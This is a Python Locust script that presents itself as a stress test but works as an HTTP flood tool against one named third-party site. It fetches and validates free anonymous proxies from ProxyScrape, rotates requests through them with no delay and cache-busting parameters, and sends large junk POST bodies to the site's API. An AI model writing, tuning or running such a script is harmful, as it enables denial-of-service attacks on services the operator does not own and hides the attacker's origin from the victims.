# locustfile_max_power.py
# Distributed Locust script with rotating proxies from ProxyScrape & proxy validation 🚀

from gevent import monkey
monkey.patch_all()

import gc, uuid, random, time, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from locust import HttpUser, TaskSet, task, events, constant

# Disable Python GC to avoid pauses under heavy load
gc.disable()

# Proxy list source
PROXY_SOURCE_URL = (
    "https://api.proxyscrape.com/v2/?request=getproxies"
    "&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
)
# How many proxies to validate
MAX_PROXIES_TO_CHECK = 100
# Timeout for validating each proxy
VALIDATION_TIMEOUT = 5
# Target URL for HEAD validation
target_url = "https://restorecord-leak-search.vercel.app/"

@events.test_start.add_listener
def fetch_and_validate_proxies(environment, **kwargs):
    print("[ProxySetup] Fetching proxy list...")
    try:
        resp = requests.get(PROXY_SOURCE_URL, timeout=15)
        resp.raise_for_status()
        raw_proxies = [p.strip() for p in resp.text.splitlines() if p.strip()]
        print(f"[ProxySetup] Retrieved {len(raw_proxies)} proxies, validating up to {MAX_PROXIES_TO_CHECK}...")
    except Exception as e:
        print(f"[ProxySetup] Failed to fetch proxies: {e}")
        environment.proxies = []
        return

    valid = []
    def validate(proxy):
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        try:
            r = requests.head(target_url, proxies=proxies, timeout=VALIDATION_TIMEOUT)
            if r.status_code < 400:
                return proxy
        except:
            return None

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(validate, p): p for p in raw_proxies[:MAX_PROXIES_TO_CHECK]}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                valid.append(result)
                print(f"[ProxySetup] Valid proxy: {result}")
    environment.proxies = valid
    print(f"[ProxySetup] Validation complete: {len(valid)} working proxies")

class UserBehavior(TaskSet):
    @task(7)
    def search(self):
        proxy = random.choice(self.environment.proxies) if self.environment.proxies else None
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

        query = random.choice([
            "123456789012345678",
            "987654321098765432",
            "user_example",
            "ip:192.168.0.1",
        ])
        path = f"https://restorecord-leak-search.vercel.app/?q={query}&nocache={uuid.uuid4().hex}"

        start = time.time()
        try:
            r = requests.get(path, headers={"Cache-Control":"no-cache","Pragma":"no-cache"}, proxies=proxies, timeout=10)
            elapsed = int((time.time() - start) * 1000)
            if r.status_code < 400:
                events.request.fire(request_type="GET", name="/search", response_time=elapsed, response_length=len(r.content))
            else:
                events.request.fire(request_type="GET", name="/search", response_time=elapsed, response_length=len(r.content), exception=Exception(f"{r.status_code}"))
        except Exception as e:
            elapsed = int((time.time() - start) * 1000)
            events.request.fire(request_type="GET", name="/search", response_time=elapsed, response_length=0, exception=e)

    @task(3)
    def heavy_api(self):
        proxy = random.choice(self.environment.proxies) if self.environment.proxies else None
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        payload = {"data": "x" * random.randint(1000, 10000)}
        url = "https://restorecord-leak-search.vercel.app/api/process"

        start = time.time()
        try:
            r = requests.post(url, json=payload, proxies=proxies, timeout=10)
            elapsed = int((time.time() - start) * 1000)
            if r.status_code < 400:
                events.request.fire(request_type="POST", name="/api/process", response_time=elapsed, response_length=len(r.content))
            else:
                events.request.fire(request_type="POST", name="/api/process", response_time=elapsed, response_length=len(r.content), exception=Exception(f"{r.status_code}"))
        except Exception as e:
            elapsed = int((time.time() - start) * 1000)
            events.request.fire(request_type="POST", name="/api/process", response_time=elapsed, response_length=0, exception=e)

class WebsiteUser(HttpUser):
    abstract = True
    wait_time = constant(0)

class ProxyUser(WebsiteUser):
    tasks = [UserBehavior]

@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("[ChaosMonkey] Proxy stress test started...")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("[ChaosMonkey] Proxy stress test complete.")
    
